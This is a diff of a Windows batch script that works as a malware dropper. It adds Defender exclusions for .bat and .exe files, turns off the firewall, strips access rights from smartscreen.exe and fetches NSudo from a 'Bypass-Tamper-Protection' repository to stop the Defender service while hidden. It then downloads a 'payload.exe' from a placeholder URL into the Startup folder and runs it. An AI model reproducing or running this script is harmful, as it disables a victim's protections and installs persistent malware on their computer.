@@ -23,10 +23,9 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-takeown /f "%systemroot%\System32\smartscreen.exe" /a
-icacls "%systemroot%\System32\smartscreen.exe" /reset
-taskkill /im smartscreen.exe /f
 
+
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 
@@ -63,6 +62,8 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
+icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+
 cd  %temp%
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
  
@@ -71,5 +72,4 @@ NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://direct-url/foryour-payload', '.\payload.exe') }
 start payload.exe 
-
 
